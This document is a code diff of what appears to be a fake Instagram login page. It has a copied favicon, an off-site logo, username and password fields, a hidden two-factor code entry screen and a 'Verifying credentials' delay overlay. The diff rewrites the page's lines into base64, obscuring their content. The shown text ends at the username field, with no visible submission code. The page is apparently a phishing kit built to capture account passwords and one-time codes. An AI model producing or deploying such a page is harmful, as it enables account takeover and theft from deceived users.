@@ -1,465 +1,465 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login • Instagram</title>
-    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v4/y9/r/l5OZ5m7Mx3I.ico">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; flex-direction: column; }
-        .wrapper { max-width: 935px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 32px; flex-grow: 1; }
-        .phone-container { flex-shrink: 0; display: none; }
-        @media (min-width: 876px) { .phone-container { display: block; } }
-        .phone-frame { width: 380px; height: 580px; border: 8px solid #262626; border-radius: 32px; background: #fff; overflow: hidden; box-shadow: 0 0 0 2px #dbdbdb; }
-        .phone-frame .screen { width: 100%; height: 100%; overflow: hidden; position: relative; }
-        .slides { width: 100%; height: 100%; display: flex; transition: transform 0.5s ease-in-out; }
-        .slide { min-width: 100%; height: 100%; }
-        .slide img { width: 100%; height: 100%; object-fit: cover; display: block; }
-        .login-section { max-width: 350px; width: 100%; }
-        .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 32px 40px 20px; margin-bottom: 10px; text-align: center; }
-        .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; }
-        .logo img { width: 175px; height: auto; display: block; }
-        #loginForm { display: flex; flex-direction: column; gap: 6px; }
-        #loginForm input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
-        #loginForm input:focus { border-color: #a8a8a8; }
-        #loginForm input::placeholder { color: #8e8e8e; }
-        #loginForm .btn-wrapper { position: relative; margin-top: 8px; }
-        #loginBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; }
-        #loginBtn:not(:disabled) { opacity: 1; }
-        #loginBtn:disabled { cursor: not-allowed; }
-        #cooldownOverlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #0095f6; border-radius: 8px; color: #fff; font-weight: 600; font-size: 13px; align-items: center; justify-content: center; gap: 6px; pointer-events: none; z-index: 2; }
-        #cooldownOverlay .spinner { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .separator { display: flex; align-items: center; margin: 14px 0 18px; }
-        .separator .line { flex: 1; height: 1px; background: #dbdbdb; }
-        .separator .or { color: #737373; font-size: 13px; font-weight: 600; margin: 0 18px; }
-        .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; background: none; border: none; color: #385185; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 12px; width: 100%; }
-        .fb-login img { width: 16px; height: 16px; }
-        .forgot-password { font-size: 12px; color: #00376b; text-decoration: none; }
-        .forgot-password:hover { text-decoration: underline; }
-        .signup-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px 40px; text-align: center; font-size: 14px; }
-        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
-        .apps-section { margin-top: 16px; text-align: center; }
-        .apps-section p { font-size: 14px; margin-bottom: 12px; color: #262626; }
-        .apps-badges { display: flex; justify-content: center; gap: 8px; }
-        .apps-badges img { height: 40px; width: auto; }
-        footer { margin-top: 24px; text-align: center; max-width: 100%; }
-        footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 16px; font-size: 12px; margin-bottom: 12px; }
-        footer .links a { color: #8e8e8e; text-decoration: none; }
-        footer .links a:hover { text-decoration: underline; }
-        footer .copyright { color: #8e8e8e; font-size: 12px; }
-        #twofaSection { display: none; }
-        #twofaSection .lock-icon { width: 80px; height: 80px; margin: 0 auto 16px; background: #fafafa; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        #twofaSection .lock-icon svg { width: 40px; height: 40px; }
-        #twofaSection h2 { font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 4px; }
-        #twofaSection .subtitle { font-size: 13px; color: #737373; margin-bottom: 16px; line-height: 1.4; }
-        #twofaSection .subtitle span { color: #262626; font-weight: 500; }
-        .code-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 12px; }
-        .code-inputs input { width: 42px; height: 46px; text-align: center; font-size: 18px; font-weight: 600; border: 1px solid #dbdbdb; border-radius: 4px; outline: none; background: #fafafa; }
-        .code-inputs input:focus { border-color: #a8a8a8; background: #fff; }
-        #verifyBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; margin-bottom: 14px; }
-        #verifyBtn:not(:disabled) { opacity: 1; }
-        #verifyBtn:disabled { cursor: not-allowed; }
-        .resend-area { font-size: 12px; color: #737373; }
-        #resendBtn { background: none; border: none; color: #0095f6; font-weight: 600; font-size: 12px; cursor: pointer; font-family: inherit; }
-        #resendBtn:disabled { color: #737373; cursor: not-allowed; }
-        .back-link { display: block; margin-top: 16px; font-size: 12px; color: #00376b; text-decoration: none; }
-        .back-link:hover { text-decoration: underline; }
-        #loadingScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
-        #loadingScreen .loader-spinner { width: 40px; height: 40px; border: 3px solid #dbdbdb; border-top-color: #0095f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        #loadingScreen p { font-size: 14px; color: #262626; font-weight: 500; }
-        @media (max-width: 450px) { body { background: #fff; padding: 0; } .card { border: none; padding: 40px 20px 20px; } .signup-card { border: none; } }
-        #errorMsg { color: #ed4956; font-size: 12px; display: none; margin-bottom: 10px; }
-        .success-msg { color: #2ecc71; font-size: 13px; font-weight: 500; display: none; margin-bottom: 10px; }
-    </style>
-</head>
-<body>
+PCFET0NUWVBFIGh0bWw-
+PGh0bWwgbGFuZz0iZW4iPg
+PGhlYWQ-
+ICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4
+ICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4
+ICAgIDx0aXRsZT5Mb2dpbiDigKIgSW5zdGFncmFtPC90aXRsZT4
+ICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL3N0YXRpYy5jZG5pbnN0YWdyYW0uY29tL3JzcmMucGhwL3Y0L3k5L3IvbDVPWjVtN014M0kuaWNvIj4
+ICAgIDxzdHlsZT4
+ICAgICAgICAqIHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyBib3gtc2l6aW5nOiBib3JkZXItYm94OyBmb250LWZhbWlseTogLWFwcGxlLXN5c3RlbSwgQmxpbmtNYWNTeXN0ZW1Gb250LCAnU2Vnb2UgVUknLCBSb2JvdG8sIEhlbHZldGljYSwgQXJpYWwsIHNhbnMtc2VyaWY7IH0
+ICAgICAgICBib2R5IHsgYmFja2dyb3VuZDogI2ZhZmFmYTsgZGlzcGxheTogZmxleDsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IG1pbi1oZWlnaHQ6IDEwMHZoOyBwYWRkaW5nOiAyMHB4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyB9
+ICAgICAgICAud3JhcHBlciB7IG1heC13aWR0aDogOTM1cHg7IHdpZHRoOiAxMDAlOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiAzMnB4OyBmbGV4LWdyb3c6IDE7IH0
+ICAgICAgICAucGhvbmUtY29udGFpbmVyIHsgZmxleC1zaHJpbms6IDA7IGRpc3BsYXk6IG5vbmU7IH0
+ICAgICAgICBAbWVkaWEgKG1pbi13aWR0aDogODc2cHgpIHsgLnBob25lLWNvbnRhaW5lciB7IGRpc3BsYXk6IGJsb2NrOyB9IH0
+ICAgICAgICAucGhvbmUtZnJhbWUgeyB3aWR0aDogMzgwcHg7IGhlaWdodDogNTgwcHg7IGJvcmRlcjogOHB4IHNvbGlkICMyNjI2MjY7IGJvcmRlci1yYWRpdXM6IDMycHg7IGJhY2tncm91bmQ6ICNmZmY7IG92ZXJmbG93OiBoaWRkZW47IGJveC1zaGFkb3c6IDAgMCAwIDJweCAjZGJkYmRiOyB9
+ICAgICAgICAucGhvbmUtZnJhbWUgLnNjcmVlbiB7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7IG92ZXJmbG93OiBoaWRkZW47IHBvc2l0aW9uOiByZWxhdGl2ZTsgfQ
+ICAgICAgICAuc2xpZGVzIHsgd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgZGlzcGxheTogZmxleDsgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuNXMgZWFzZS1pbi1vdXQ7IH0
+ICAgICAgICAuc2xpZGUgeyBtaW4td2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgfQ
+ICAgICAgICAuc2xpZGUgaW1nIHsgd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgb2JqZWN0LWZpdDogY292ZXI7IGRpc3BsYXk6IGJsb2NrOyB9
+ICAgICAgICAubG9naW4tc2VjdGlvbiB7IG1heC13aWR0aDogMzUwcHg7IHdpZHRoOiAxMDAlOyB9
+ICAgICAgICAuY2FyZCB7IGJhY2tncm91bmQ6ICNmZmY7IGJvcmRlcjogMXB4IHNvbGlkICNkYmRiZGI7IGJvcmRlci1yYWRpdXM6IDFweDsgcGFkZGluZzogMzJweCA0MHB4IDIwcHg7IG1hcmdpbi1ib3R0b206IDEwcHg7IHRleHQtYWxpZ246IGNlbnRlcjsgfQ
+ICAgICAgICAubG9nbyB7IGRpc3BsYXk6IGZsZXg7IGp1c3RpZnktY29udGVudDogY2VudGVyOyBhbGlnbi1pdGVtczogY2VudGVyOyBtYXJnaW4tYm90dG9tOiAyNHB4OyB9
+ICAgICAgICAubG9nbyBpbWcgeyB3aWR0aDogMTc1cHg7IGhlaWdodDogYXV0bzsgZGlzcGxheTogYmxvY2s7IH0
+ICAgICAgICAjbG9naW5Gb3JtIHsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgZ2FwOiA2cHg7IH0
+ICAgICAgICAjbG9naW5Gb3JtIGlucHV0IHsgd2lkdGg6IDEwMCU7IHBhZGRpbmc6IDlweCAwIDdweCA4cHg7IGJhY2tncm91bmQ6ICNmYWZhZmE7IGJvcmRlcjogMXB4IHNvbGlkICNkYmRiZGI7IGJvcmRlci1yYWRpdXM6IDNweDsgZm9udC1zaXplOiAxMnB4OyBvdXRsaW5lOiBub25lOyB9
+ICAgICAgICAjbG9naW5Gb3JtIGlucHV0OmZvY3VzIHsgYm9yZGVyLWNvbG9yOiAjYThhOGE4OyB9
+ICAgICAgICAjbG9naW5Gb3JtIGlucHV0OjpwbGFjZWhvbGRlciB7IGNvbG9yOiAjOGU4ZThlOyB9
+ICAgICAgICAjbG9naW5Gb3JtIC5idG4td3JhcHBlciB7IHBvc2l0aW9uOiByZWxhdGl2ZTsgbWFyZ2luLXRvcDogOHB4OyB9
+ICAgICAgICAjbG9naW5CdG4geyB3aWR0aDogMTAwJTsgcGFkZGluZzogN3B4IDE2cHg7IGJhY2tncm91bmQ6ICMwMDk1ZjY7IGJvcmRlcjogbm9uZTsgYm9yZGVyLXJhZGl1czogOHB4OyBjb2xvcjogI2ZmZjsgZm9udC13ZWlnaHQ6IDYwMDsgZm9udC1zaXplOiAxNHB4OyBjdXJzb3I6IHBvaW50ZXI7IG9wYWNpdHk6IDAuNzsgdHJhbnNpdGlvbjogb3BhY2l0eSAwLjJzOyB9
+ICAgICAgICAjbG9naW5CdG46bm90KDpkaXNhYmxlZCkgeyBvcGFjaXR5OiAxOyB9
+ICAgICAgICAjbG9naW5CdG46ZGlzYWJsZWQgeyBjdXJzb3I6IG5vdC1hbGxvd2VkOyB9
+ICAgICAgICAjY29vbGRvd25PdmVybGF5IHsgZGlzcGxheTogbm9uZTsgcG9zaXRpb246IGFic29sdXRlOyB0b3A6IDA7IGxlZnQ6IDA7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7IGJhY2tncm91bmQ6ICMwMDk1ZjY7IGJvcmRlci1yYWRpdXM6IDhweDsgY29sb3I6ICNmZmY7IGZvbnQtd2VpZ2h0OiA2MDA7IGZvbnQtc2l6ZTogMTNweDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IGdhcDogNnB4OyBwb2ludGVyLWV2ZW50czogbm9uZTsgei1pbmRleDogMjsgfQ
+ICAgICAgICAjY29vbGRvd25PdmVybGF5IC5zcGlubmVyIHsgd2lkdGg6IDE0cHg7IGhlaWdodDogMTRweDsgYm9yZGVyOiAycHggc29saWQgcmdiYSgyNTUsMjU1LDI1NSwwLjMpOyBib3JkZXItdG9wLWNvbG9yOiAjZmZmOyBib3JkZXItcmFkaXVzOiA1MCU7IGFuaW1hdGlvbjogc3BpbiAwLjhzIGxpbmVhciBpbmZpbml0ZTsgfQ
+ICAgICAgICBAa2V5ZnJhbWVzIHNwaW4geyB0byB7IHRyYW5zZm9ybTogcm90YXRlKDM2MGRlZyk7IH0gfQ
+ICAgICAgICAuc2VwYXJhdG9yIHsgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgbWFyZ2luOiAxNHB4IDAgMThweDsgfQ
+ICAgICAgICAuc2VwYXJhdG9yIC5saW5lIHsgZmxleDogMTsgaGVpZ2h0OiAxcHg7IGJhY2tncm91bmQ6ICNkYmRiZGI7IH0
+ICAgICAgICAuc2VwYXJhdG9yIC5vciB7IGNvbG9yOiAjNzM3MzczOyBmb250LXNpemU6IDEzcHg7IGZvbnQtd2VpZ2h0OiA2MDA7IG1hcmdpbjogMCAxOHB4OyB9
+ICAgICAgICAuZmItbG9naW4geyBkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgZ2FwOiA4cHg7IGJhY2tncm91bmQ6IG5vbmU7IGJvcmRlcjogbm9uZTsgY29sb3I6ICMzODUxODU7IGZvbnQtd2VpZ2h0OiA2MDA7IGZvbnQtc2l6ZTogMTRweDsgY3Vyc29yOiBwb2ludGVyOyBtYXJnaW4tYm90dG9tOiAxMnB4OyB3aWR0aDogMTAwJTsgfQ
+ICAgICAgICAuZmItbG9naW4gaW1nIHsgd2lkdGg6IDE2cHg7IGhlaWdodDogMTZweDsgfQ
+ICAgICAgICAuZm9yZ290LXBhc3N3b3JkIHsgZm9udC1zaXplOiAxMnB4OyBjb2xvcjogIzAwMzc2YjsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyB9
+ICAgICAgICAuZm9yZ290LXBhc3N3b3JkOmhvdmVyIHsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IH0
+ICAgICAgICAuc2lnbnVwLWNhcmQgeyBiYWNrZ3JvdW5kOiAjZmZmOyBib3JkZXI6IDFweCBzb2xpZCAjZGJkYmRiOyBib3JkZXItcmFkaXVzOiAxcHg7IHBhZGRpbmc6IDIwcHggNDBweDsgdGV4dC1hbGlnbjogY2VudGVyOyBmb250LXNpemU6IDE0cHg7IH0
+ICAgICAgICAuc2lnbnVwLWNhcmQgYSB7IGNvbG9yOiAjMDA5NWY2OyBmb250LXdlaWdodDogNjAwOyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IH0
+ICAgICAgICAuYXBwcy1zZWN0aW9uIHsgbWFyZ2luLXRvcDogMTZweDsgdGV4dC1hbGlnbjogY2VudGVyOyB9
+ICAgICAgICAuYXBwcy1zZWN0aW9uIHAgeyBmb250LXNpemU6IDE0cHg7IG1hcmdpbi1ib3R0b206IDEycHg7IGNvbG9yOiAjMjYyNjI2OyB9
+ICAgICAgICAuYXBwcy1iYWRnZXMgeyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgZ2FwOiA4cHg7IH0
+ICAgICAgICAuYXBwcy1iYWRnZXMgaW1nIHsgaGVpZ2h0OiA0MHB4OyB3aWR0aDogYXV0bzsgfQ
+ICAgICAgICBmb290ZXIgeyBtYXJnaW4tdG9wOiAyNHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IG1heC13aWR0aDogMTAwJTsgfQ
+ICAgICAgICBmb290ZXIgLmxpbmtzIHsgZGlzcGxheTogZmxleDsgZmxleC13cmFwOiB3cmFwOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgZ2FwOiA4cHggMTZweDsgZm9udC1zaXplOiAxMnB4OyBtYXJnaW4tYm90dG9tOiAxMnB4OyB9
+ICAgICAgICBmb290ZXIgLmxpbmtzIGEgeyBjb2xvcjogIzhlOGU4ZTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyB9
+ICAgICAgICBmb290ZXIgLmxpbmtzIGE6aG92ZXIgeyB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsgfQ
+ICAgICAgICBmb290ZXIgLmNvcHlyaWdodCB7IGNvbG9yOiAjOGU4ZThlOyBmb250LXNpemU6IDEycHg7IH0
+ICAgICAgICAjdHdvZmFTZWN0aW9uIHsgZGlzcGxheTogbm9uZTsgfQ
+ICAgICAgICAjdHdvZmFTZWN0aW9uIC5sb2NrLWljb24geyB3aWR0aDogODBweDsgaGVpZ2h0OiA4MHB4OyBtYXJnaW46IDAgYXV0byAxNnB4OyBiYWNrZ3JvdW5kOiAjZmFmYWZhOyBib3JkZXItcmFkaXVzOiA1MCU7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGp1c3RpZnktY29udGVudDogY2VudGVyOyB9
+ICAgICAgICAjdHdvZmFTZWN0aW9uIC5sb2NrLWljb24gc3ZnIHsgd2lkdGg6IDQwcHg7IGhlaWdodDogNDBweDsgfQ
+ICAgICAgICAjdHdvZmFTZWN0aW9uIGgyIHsgZm9udC1zaXplOiAxOHB4OyBmb250LXdlaWdodDogNjAwOyBjb2xvcjogIzI2MjYyNjsgbWFyZ2luLWJvdHRvbTogNHB4OyB9
+ICAgICAgICAjdHdvZmFTZWN0aW9uIC5zdWJ0aXRsZSB7IGZvbnQtc2l6ZTogMTNweDsgY29sb3I6ICM3MzczNzM7IG1hcmdpbi1ib3R0b206IDE2cHg7IGxpbmUtaGVpZ2h0OiAxLjQ7IH0
+ICAgICAgICAjdHdvZmFTZWN0aW9uIC5zdWJ0aXRsZSBzcGFuIHsgY29sb3I6ICMyNjI2MjY7IGZvbnQtd2VpZ2h0OiA1MDA7IH0
+ICAgICAgICAuY29kZS1pbnB1dHMgeyBkaXNwbGF5OiBmbGV4OyBnYXA6IDhweDsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IG1hcmdpbi1ib3R0b206IDEycHg7IH0
+ICAgICAgICAuY29kZS1pbnB1dHMgaW5wdXQgeyB3aWR0aDogNDJweDsgaGVpZ2h0OiA0NnB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtc2l6ZTogMThweDsgZm9udC13ZWlnaHQ6IDYwMDsgYm9yZGVyOiAxcHggc29saWQgI2RiZGJkYjsgYm9yZGVyLXJhZGl1czogNHB4OyBvdXRsaW5lOiBub25lOyBiYWNrZ3JvdW5kOiAjZmFmYWZhOyB9
+ICAgICAgICAuY29kZS1pbnB1dHMgaW5wdXQ6Zm9jdXMgeyBib3JkZXItY29sb3I6ICNhOGE4YTg7IGJhY2tncm91bmQ6ICNmZmY7IH0
+ICAgICAgICAjdmVyaWZ5QnRuIHsgd2lkdGg6IDEwMCU7IHBhZGRpbmc6IDdweCAxNnB4OyBiYWNrZ3JvdW5kOiAjMDA5NWY2OyBib3JkZXI6IG5vbmU7IGJvcmRlci1yYWRpdXM6IDhweDsgY29sb3I6ICNmZmY7IGZvbnQtd2VpZ2h0OiA2MDA7IGZvbnQtc2l6ZTogMTRweDsgY3Vyc29yOiBwb2ludGVyOyBvcGFjaXR5OiAwLjc7IHRyYW5zaXRpb246IG9wYWNpdHkgMC4yczsgbWFyZ2luLWJvdHRvbTogMTRweDsgfQ
+ICAgICAgICAjdmVyaWZ5QnRuOm5vdCg6ZGlzYWJsZWQpIHsgb3BhY2l0eTogMTsgfQ
+ICAgICAgICAjdmVyaWZ5QnRuOmRpc2FibGVkIHsgY3Vyc29yOiBub3QtYWxsb3dlZDsgfQ
+ICAgICAgICAucmVzZW5kLWFyZWEgeyBmb250LXNpemU6IDEycHg7IGNvbG9yOiAjNzM3MzczOyB9
+ICAgICAgICAjcmVzZW5kQnRuIHsgYmFja2dyb3VuZDogbm9uZTsgYm9yZGVyOiBub25lOyBjb2xvcjogIzAwOTVmNjsgZm9udC13ZWlnaHQ6IDYwMDsgZm9udC1zaXplOiAxMnB4OyBjdXJzb3I6IHBvaW50ZXI7IGZvbnQtZmFtaWx5OiBpbmhlcml0OyB9
+ICAgICAgICAjcmVzZW5kQnRuOmRpc2FibGVkIHsgY29sb3I6ICM3MzczNzM7IGN1cnNvcjogbm90LWFsbG93ZWQ7IH0
+ICAgICAgICAuYmFjay1saW5rIHsgZGlzcGxheTogYmxvY2s7IG1hcmdpbi10b3A6IDE2cHg7IGZvbnQtc2l6ZTogMTJweDsgY29sb3I6ICMwMDM3NmI7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgfQ
+ICAgICAgICAuYmFjay1saW5rOmhvdmVyIHsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IH0
+ICAgICAgICAjbG9hZGluZ1NjcmVlbiB7IGRpc3BsYXk6IG5vbmU7IHBvc2l0aW9uOiBmaXhlZDsgdG9wOiAwOyBsZWZ0OiAwOyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyBiYWNrZ3JvdW5kOiAjZmZmOyB6LWluZGV4OiA5OTk5OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBhbGlnbi1pdGVtczogY2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgZ2FwOiAxNnB4OyB9
+ICAgICAgICAjbG9hZGluZ1NjcmVlbiAubG9hZGVyLXNwaW5uZXIgeyB3aWR0aDogNDBweDsgaGVpZ2h0OiA0MHB4OyBib3JkZXI6IDNweCBzb2xpZCAjZGJkYmRiOyBib3JkZXItdG9wLWNvbG9yOiAjMDA5NWY2OyBib3JkZXItcmFkaXVzOiA1MCU7IGFuaW1hdGlvbjogc3BpbiAwLjhzIGxpbmVhciBpbmZpbml0ZTsgfQ
+ICAgICAgICAjbG9hZGluZ1NjcmVlbiBwIHsgZm9udC1zaXplOiAxNHB4OyBjb2xvcjogIzI2MjYyNjsgZm9udC13ZWlnaHQ6IDUwMDsgfQ
+ICAgICAgICBAbWVkaWEgKG1heC13aWR0aDogNDUwcHgpIHsgYm9keSB7IGJhY2tncm91bmQ6ICNmZmY7IHBhZGRpbmc6IDA7IH0gLmNhcmQgeyBib3JkZXI6IG5vbmU7IHBhZGRpbmc6IDQwcHggMjBweCAyMHB4OyB9IC5zaWdudXAtY2FyZCB7IGJvcmRlcjogbm9uZTsgfSB9
+ICAgICAgICAjZXJyb3JNc2cgeyBjb2xvcjogI2VkNDk1NjsgZm9udC1zaXplOiAxMnB4OyBkaXNwbGF5OiBub25lOyBtYXJnaW4tYm90dG9tOiAxMHB4OyB9
+ICAgICAgICAuc3VjY2Vzcy1tc2cgeyBjb2xvcjogIzJlY2M3MTsgZm9udC1zaXplOiAxM3B4OyBmb250LXdlaWdodDogNTAwOyBkaXNwbGF5OiBub25lOyBtYXJnaW4tYm90dG9tOiAxMHB4OyB9
+ICAgIDwvc3R5bGU-
+PC9oZWFkPg
+PGJvZHk-
 
-<div id="loadingScreen">
-    <div class="loader-spinner"></div>
-    <p id="loadingText">Verifying...</p>
-</div>
+PGRpdiBpZD0ibG9hZGluZ1NjcmVlbiI-
+ICAgIDxkaXYgY2xhc3M9ImxvYWRlci1zcGlubmVyIj48L2Rpdj4
+ICAgIDxwIGlkPSJsb2FkaW5nVGV4dCI-VmVyaWZ5aW5nLi4uPC9wPg
+PC9kaXY-
 
-<div class="wrapper">
-    <div class="phone-container">
-        <div class="phone-frame">
-            <div class="screen">
-                <div class="slides" id="slides">
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=380&h=580&fit=crop" alt=""></div>
-                </div>
-            </div>
-        </div>
-    </div>
+PGRpdiBjbGFzcz0id3JhcHBlciI-
+ICAgIDxkaXYgY2xhc3M9InBob25lLWNvbnRhaW5lciI-
+ICAgICAgICA8ZGl2IGNsYXNzPSJwaG9uZS1mcmFtZSI-
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0ic2NyZWVuIj4
+ICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InNsaWRlcyIgaWQ9InNsaWRlcyI-
+ICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzbGlkZSI-PGltZyBzcmM9Imh0dHBzOi8vaW1hZ2VzLnVuc3BsYXNoLmNvbS9waG90by0xNTA0Njc0OTAwMjQ3LTA4NzdkZjljYzgzNj93PTM4MCZoPTU4MCZmaXQ9Y3JvcCIgYWx0PSIiPjwvZGl2Pg
+ICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzbGlkZSI-PGltZyBzcmM9Imh0dHBzOi8vaW1hZ2VzLnVuc3BsYXNoLmNvbS9waG90by0xNTQyMjkxMDI2LTdlZWMyNjRjMjdmZj93PTM4MCZoPTU4MCZmaXQ9Y3JvcCIgYWx0PSIiPjwvZGl2Pg
+ICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzbGlkZSI-PGltZyBzcmM9Imh0dHBzOi8vaW1hZ2VzLnVuc3BsYXNoLmNvbS9waG90by0xNTE3ODQxOTA1MjQwLTQ3Mjk4OGJhYmRmOT93PTM4MCZoPTU4MCZmaXQ9Y3JvcCIgYWx0PSIiPjwvZGl2Pg
+ICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzbGlkZSI-PGltZyBzcmM9Imh0dHBzOi8vaW1hZ2VzLnVuc3BsYXNoLmNvbS9waG90by0xNTI5NjI2NDU1NTk0LTRmZjA4MDJjZmI3ZT93PTM4MCZoPTU4MCZmaXQ9Y3JvcCIgYWx0PSIiPjwvZGl2Pg
+ICAgICAgICAgICAgICAgIDwvZGl2Pg
+ICAgICAgICAgICAgPC9kaXY-
+ICAgICAgICA8L2Rpdj4
+ICAgIDwvZGl2Pg
 
-    <div class="login-section">
-        <div class="card" id="loginCard">
-            <div class="logo">
-                <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
-            </div>
-            <form id="loginForm" autocomplete="off">
-                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
-                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
-                <div class="btn-wrapper">
-                    <button type="submit" id="loginBtn" disabled>Log in</button>
-                    <div id="cooldownOverlay">
-                        <div class="spinner"></div>
-                        <span id="cooldownText">Verifying credentials... (10s)</span>
-                    </div>
-                </div>
-            </form>
-            <div class="separator">
-                <span class="line"></span>
-                <span class="or">OR</span>
-                <span class="line"></span>
-            </div>
-            <button class="fb-login" id="fbLogin">
-                <img src="https://i.imgur.com/exksovo.png" alt="Facebook">
-                Log in with Facebook
-            </button>
-            <a href="#" class="forgot-password">Forgot password?</a>
-        </div>
+ICAgIDxkaXYgY2xhc3M9ImxvZ2luLXNlY3Rpb24iPg
+ICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIiBpZD0ibG9naW5DYXJkIj4
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0ibG9nbyI-
+ICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJodHRwczovL2kuaW1ndXIuY29tL3d2TGlLYW0ucG5nIiBhbHQ9Ikluc3RhZ3JhbSIgd2lkdGg9IjE3NSIgaGVpZ2h0PSI1MSI-
+ICAgICAgICAgICAgPC9kaXY-
+ICAgICAgICAgICAgPGZvcm0gaWQ9ImxvZ2luRm9ybSIgYXV0b2NvbXBsZXRlPSJvZmYiPg
+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0idXNlcm5hbWUiIHBsYWNlaG9sZGVyPSJQaG9uZSBudW1iZXIsIHVzZXJuYW1lLCBvciBlbWFpbCIgYXV0b2NvbXBsZXRlPSJ1c2VybmFtZSI-
